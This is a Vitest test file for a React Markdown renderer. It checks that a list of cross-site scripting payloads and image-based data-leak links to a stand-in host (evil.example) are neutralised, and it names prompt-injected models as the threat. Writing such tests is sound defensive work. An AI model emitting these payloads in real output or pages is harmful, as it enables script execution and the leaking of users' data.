import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { Markdown, safeUrl } from './markdown';

const render = (text: string): string => renderToStaticMarkup(<Markdown text={text} />);

// Payloads a prompt-injected model might emit to run script or leak data from the page.
const PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<iframe src="https://evil.example"></iframe>',
  '<a href="javascript:alert(1)">click</a>',
  '[click](javascript:alert(1))',
  '[click](JaVaScRiPt:alert(1))',
  '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '[click](vbscript:msgbox(1))',
  '![leak](https://evil.example/collect?secret=123)',
  '![](https://evil.example/pixel.png)',
  '<svg onload=alert(1)>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '[ref]: javascript:alert(1)\n\n[link][ref]',
  '<details open ontoggle=alert(1)>',
];

describe('Markdown', () => {
  it('renders common formatting', () => {
    const html = render(
      '**Bold**, _italic_, `code`\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |',
    );
    expect(html).toContain('<strong>Bold</strong>');
    expect(html).toContain('<em>italic</em>');
    expect(html).toContain('<code>code</code>');
    expect(html).toContain('<li>one</li>');
    expect(html).toContain('<table>');
  });

  it('opens safe links in a new tab without leaking the opener or referrer', () => {
    expect(render('[docs](https://example.com/docs)')).toBe(
      '<p><a href="https://example.com/docs" target="_blank" rel="noopener noreferrer nofollow">docs</a></p>',
    );
  });

  it.each(PAYLOADS)('neutralizes %s', (payload) => {
    const html = render(payload).toLowerCase();
    expect(html).not.toMatch(/<(script|iframe|img|svg|details|div|object|embed)\b/);
    expect(html).not.toMatch(/\son\w+=/);
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('vbscript:');
    expect(html).not.toContain('data:text');
    expect(html).not.toContain('evil.example/collect');
    expect(html).not.toContain('pixel.png');
  });

  it('shows image alt text instead of loading the image', () => {
    expect(render('![chart of sales](https://example.com/chart.png)')).toContain(
      '[chart of sales]',
    );
  });
});

describe('safeUrl', () => {
  it.each([
    ['https://example.com/a?b=1', 'https://example.com/a?b=1'],
    ['mailto:hello@example.com', 'mailto:hello@example.com'],
    ['javascript:alert(1)', ''],
    ['/relative/path', ''],
    ['//evil.example', ''],
  ])('%s → %s', (input, expected) => {
    expect(safeUrl(input)).toBe(expected);
  });
});
